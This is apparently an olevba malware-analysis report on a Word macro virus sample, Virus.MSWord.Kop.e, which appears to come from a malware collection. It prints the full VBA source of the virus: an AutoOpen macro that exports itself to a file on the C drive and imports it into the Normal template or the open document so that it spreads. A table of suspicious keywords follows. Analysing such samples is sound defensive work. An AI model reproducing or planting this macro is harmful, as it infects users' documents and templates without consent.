olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kop.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kop.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO kopieren.bas 
in file: Virus.MSWord.Kop.e - OLE stream: 'Macros/VBA/kopieren'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
If NormalTemplate.VBProject.VBComponents.Item("kopieren").Name <> "kopieren" Then
ActiveDocument.VBProject.VBComponents("kopieren").Export "c:\kopieren.vxd"
NormalTemplate.VBProject.VBComponents.Import ("c:\kopieren.vxd")
ElseIf ActiveDocument.VBProject.VBComponents.Item("kopieren").Name <> "kopieren" Then
NormalTemplate.VBProject.VBComponents("kopieren").Export "c:\kopieren.vxd"
ActiveDocument.VBProject.VBComponents.Import ("c:\kopieren.vxd")
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

